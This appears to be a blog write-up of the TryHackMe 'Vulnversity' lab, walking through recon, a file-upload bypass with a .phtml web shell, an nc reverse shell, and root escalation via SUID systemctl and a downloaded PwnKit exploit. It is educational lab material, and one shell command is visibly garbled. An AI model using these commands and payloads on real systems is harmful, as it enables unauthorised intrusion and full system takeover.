---
title: VulnUniversity on TryHackMe - Boot2root
date: 2024-01-11 00:00:00 -500
categories: [Hacking for Beginners, TryHackMe]
tags: [Web, THM, Easy, Hacking]
image:
    path: https://i.ibb.co/MB3rXkS/Hip-Hop83.png
---


Hello, in this artciles i will share with you my notes for the room *Vulnversity* on TryHackMe. So for the explanation I'll keep it short and sweet.

- **The Best Academy to Learn Hacking is [Here](https://affiliate.hackthebox.com/nenandjabhata)**.
- **Beginner Friendly challenges on TryHackMe [Here](https://tryhackme.com/signup?referrer=61e8a27ddd3f3b00496505d1)**.

## Recon
First i will run an `nmap`  basic scan on our target.
```shell
└─# nmap -sV -Pn -p1-65535 --min-rate 3000 $ip
Nmap scan report for 10.10.139.223
Host is up (4.5s latency).
Not shown: 54288 filtered tcp ports (no-response), 11241 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

So we have an `Apache httpd 2.4.18` on the port `3333`, let's open it.

![The Website](https://i.ibb.co/RSkGH2R/Screenshot-2024-01-11-at-18-58-56-Vuln-University.png){:class="img-responsive"}

- **Fuzzing**
Let's search for some hidden directories on that website
```shell
└─# ffuf -u "http://10.10.139.223:3333/FUZZ" -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302
internal                [Status: 301, Size: 318, Words: 20, Lines: 10]
css                     [Status: 301, Size: 313, Words: 20, Lines: 10]
fonts                   [Status: 301, Size: 315, Words: 20, Lines: 10]
images                  [Status: 301, Size: 316, Words: 20, Lines: 10]
index.html              [Status: 200, Size: 33014, Words: 8161, Lines: 653]
internal                [Status: 301, Size: 318, Words: 20, Lines: 10]
js                      [Status: 301, Size: 312, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 300, Words: 22, Lines: 12]
```

The first interessting directory i found here is the `internal`. Let's visit it

![File Upload](https://i.ibb.co/1XgTYp4/Screenshot-2024-01-11-at-19-07-14-Screenshot.png){:class="img-responsive"}

This website have an `File Upload` functionality. Can we exploit this ? Let's try...
First i will try to upload a simple `.php` file.
```php
<?php 
phpinfo();
?>
```

![Not allowed](https://i.ibb.co/12gPM0W/Screenshot-2024-01-11-at-19-09-07-Screenshot.png){:class="img-responsive"}

Now let's use `Burpsuite` to find the allowed Extension..
- Intercept Traffic
- Send it to Burp Intruder
Load my extension from the [FuzzDB](https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/file-upload)

![BurpSuite](https://i.ibb.co/VL6xhKF/b2.png){:class="img-responsive"}

On the intruder, you see that i have only one length that's different to other length which was the `.phtml` extension.

Let's move our shell into a `shell.phtml` and upload it

![Success](https://i.ibb.co/kggLSHG/Screenshot-2024-01-11-at-19-22-57-Screenshot.png){:class="img-responsive"}

Now we got Success. 
To find where my shell is located, i will fuzz on that path `/internal`.
```shell
└─# ffuf -u "http://10.10.139.223:3333/internal/FUZZ" -w /usr/share/wordlists/dirb/common.txt
.htpasswd               [Status: 403, Size: 308, Words: 22, Lines: 12, Duration: 1057ms]
.hta                    [Status: 403, Size: 303, Words: 22, Lines: 12, Duration: 3143ms]
.htaccess               [Status: 403, Size: 308, Words: 22, Lines: 12, Duration: 3928ms]
css                     [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 925ms]
index.php               [Status: 200, Size: 525, Words: 62, Lines: 27, Duration: 918ms]
uploads                 [Status: 301, Size: 332, Words: 20, Lines: 10, Duration: 1101ms]
:: Progress: [4622/4622] :: Job [1/1] :: 32 req/sec :: Duration: [0:02:29] :: Errors: 0 ::
```
when i visit the `uploads` i see my shell here;

![Upload](https://i.ibb.co/w70ZFXR/Screenshot-2024-01-11-at-19-28-18-Index-of-internal-uploads.png){:class="img-responsive"}

Let's just click on it

![PHPinfo](https://i.ibb.co/XF8bQ1m/Screenshot-2024-01-11-at-19-30-03-phpinfo.png){:class="img-responsive"}

## Shell
To get a shell, i will use [phpbash](https://github.com/Arrexel/phpbash). I will just rename the `.php` to `.phtml` upload and then execute it like the last one

![Bash](https://i.ibb.co/NCtNvHV/Screenshot-2024-01-11-at-19-33-47-Screenshot.png){:class="img-responsive"}

Reverse shell on my Local machine.
```shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.6.32.0 1337 >/tmp/f

└─# sudo rlwrap nc -lnvp 1337 
listening on [any] 1337 ...
connect to [10.6.32.0] from (UNKNOWN) [10.10.139.223] 37420
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@vulnuniversity:/home$ ls
ls
bill
www-data@vulnuniversity:/home$ cd bill
cd bill
www-data@vulnuniversity:/home/bill$ ls -la
ls -la
total 24
drwxr-xr-x 2 bill bill 4096 Jul 31  2019 .
drwxr-xr-x 3 root root 4096 Jul 31  2019 ..
-rw-r--r-- 1 bill bill  220 Jul 31  2019 .bash_logout
-rw-r--r-- 1 bill bill 3771 Jul 31  2019 .bashrc
-rw-r--r-- 1 bill bill  655 Jul 31  2019 .profile
-rw-r--r-- 1 bill bill   33 Jul 31  2019 user.txt
www-data@vulnuniversity:/home/bill$ 
www-data@vulnuniversity:/home/bill$ cat user.txt
cat user.txt
8bd7992fbe8a6ad22a63361004cfcedb
```


## Privilege Escalation
I will search for `SUID`

```shell
www-data@vulnuniversity:/tmp$ find / -type f -perm /4000 -ls 2>/dev/nul
   402892     36 -rwsr-xr-x   1 root     root        32944 May 16  2017 /usr/bin/newuidmap
   393361     52 -rwsr-xr-x   1 root     root        49584 May 16  2017 /usr/bin/chfn
   402893     36 -rwsr-xr-x   1 root     root        32944 May 16  2017 /usr/bin/newgidmap
   393585    136 -rwsr-xr-x   1 root     root       136808 Jul  4  2017 /usr/bin/sudo
   393363     40 -rwsr-xr-x   1 root     root        40432 May 16  2017 /usr/bin/chsh
   393501     56 -rwsr-xr-x   1 root     root        54256 May 16  2017 /usr/bin/passwd
   406711     24 -rwsr-xr-x   1 root     root        23376 Jan 15  2019 /usr/bin/pkexec
   393490     40 -rwsr-xr-x   1 root     root        39904 May 16  2017 /usr/bin/newgrp
   393424     76 -rwsr-xr-x   1 root     root        75304 May 16  2017 /usr/bin/gpasswd
   405497     52 -rwsr-sr-x   1 daemon   daemon      51464 Jan 14  2016 /usr/bin/at
   406941    100 -rwsr-sr-x   1 root     root        98440 Jan 29  2019 /usr/lib/snapd/snap-confine
   406710     16 -rwsr-xr-x   1 root     root        14864 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
   405145    420 -rwsr-xr-x   1 root     root       428240 Jan 31  2019 /usr/lib/openssh/ssh-keysign
   393687     12 -rwsr-xr-x   1 root     root        10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
   666971     76 -rwsr-xr-x   1 root     root        76408 Jul 17  2019 /usr/lib/squid/pinger
   402037     44 -rwsr-xr--   1 root     messagebus    42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   402829     40 -rwsr-xr-x   1 root     root          38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
   131164     40 -rwsr-xr-x   1 root     root          40128 May 16  2017 /bin/su
   133166    140 -rwsr-xr-x   1 root     root         142032 Jan 28  2017 /bin/ntfs-3g
   131133     40 -rwsr-xr-x   1 root     root          40152 May 16  2018 /bin/mount
   131148     44 -rwsr-xr-x   1 root     root          44680 May  7  2014 /bin/ping6
   131182     28 -rwsr-xr-x   1 root     root          27608 May 16  2018 /bin/umount
   131166    648 -rwsr-xr-x   1 root     root         659856 Feb 13  2019 /bin/systemctl
   131147     44 -rwsr-xr-x   1 root     root          44168 May  7  2014 /bin/ping
   133163     32 -rwsr-xr-x   1 root     root          30800 Jul 12  2016 /bin/fusermount
   405750     36 -rwsr-xr-x   1 root     root          35600 Mar  6  2017 /sbin/mount.cifs

```
From this output, we can see that a lot of missconfiguration. So we can escalate to root using a lot of methods

- 1st: [/bin/systemctl](https://gtfobins.github.io/gtfobins/systemctl/#suid)
```shell
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
$ systemctl link $TF
$ systemctl enable --now $TF
$ cat /tmp/output
uid=0(root) gid=0(root) groups=0(root)

```
Get a shell using root user

```shell
www-data@vulnuniversity:/tmp$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.6.32.0 1338 >/tmp/f" > shell.sh

```
Now execute using systemctl
```shell
TF=$(mktemp).service
www-data@vulnuniversity:/tmp$ echo '[Service]
> Type=oneshot
> ExecStart=/bin/sh -c  "bash /tmp/shell.sh"
  ExecStart=/bin/sh -c  "bash /tmp/shell.sh"
ExecStart=/bin/sh -c  "bash /tmp/shell.sh"
[Install]
WantedBy=multi-user.target' > $TF
www-data@vulnuniversity:/tmp$ /bin/systemctl link $TF                              /bin/systemctl link $TF
/bin/systemctl link $TF
Created symlink from /etc/systemd/system/tmp.huc6dywRkn.service to /tmp/tmp.huc6dywRkn.service.
www-data@vulnuniversity:/tmp$ /bin/systemctl enable --now $TF                        /bin/systemctl enable --now $TF
/bin/systemctl enable --now $TF
Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.huc6dywRkn.service to /tmp/tmp.huc6dywRkn.service.

└─$ sudo rlwrap nc -lnvp 1338
[sudo] password for blo: 
listening on [any] 1338 ...
connect to [10.6.32.0] from (UNKNOWN) [10.10.139.223] 33980
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# 
# cat /root/root.txt
a58ff8579f0a9270368d33a9966c7fd5
# 

```


- 2st: [/usr/bin/pkexec](https://github.com/ly4k/PwnKit)
I will download the script on target machines and then run it

```shell
www-data@vulnuniversity:/tmp/priv$ wget http://10.6.32.0/pkexec.py
                                   wget http://10.6.32.0/pkexec.py
wget http://10.6.32.0/pkexec.py
--2024-01-11 21:09:48--  http://10.6.32.0/pkexec.py
Connecting to 10.6.32.0:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3068 (3.0K) [text/x-python]
Saving to: 'pkexec.py'

pkexec.py           100%[===================>]   3.00K  8.40KB/s    in 0.4s    

2024-01-11 21:09:51 (8.40 KB/s) - 'pkexec.py' saved [3068/3068]

www-data@vulnuniversity:/tmp/priv$ chmod +x pkexec.py
                                   chmod +x pkexec.py
chmod +x pkexec.py
www-data@vulnuniversity:/tmp/priv$ python3 pkexec.py
                                   python3 pkexec.py
python3 pkexec.py
Do you want to choose a custom payload? y/n (n use default payload)  n
                                                                     n
n
[+] Cleaning pervious exploiting attempt (if exist)
[+] Creating shared library for exploit code.
[+] Finding a libc library to call execve
[+] Found a library at <CDLL 'libc.so.6', handle 7f88da8114e8 at 0x7f88da6a5908>
[+] Call execve() with chosen payload
[+] Enjoy your root shell
# id;hostnamectl
  id;hostnamectl
id;hostnamectl
uid=0(root) gid=33(www-data) groups=33(www-data)
   Static hostname: vulnuniversity
         Icon name: computer-vm
           Chassis: vm
        Machine ID: 8cfd988746864b75b0050f995d421653
           Boot ID: ec816d5110194efd9005f5d301a0db78
    Virtualization: xen
  Operating System: Ubuntu 16.04.6 LTS
            Kernel: Linux 4.4.0-142-generic
      Architecture: x86-64
# 
```

Thanks for reading.
### Join Us
Thanks for reading. **Let's learn, explore, and hack together**. **Join us on Discord [here](https://discord.gg/wBT9wr9ruG)**. 
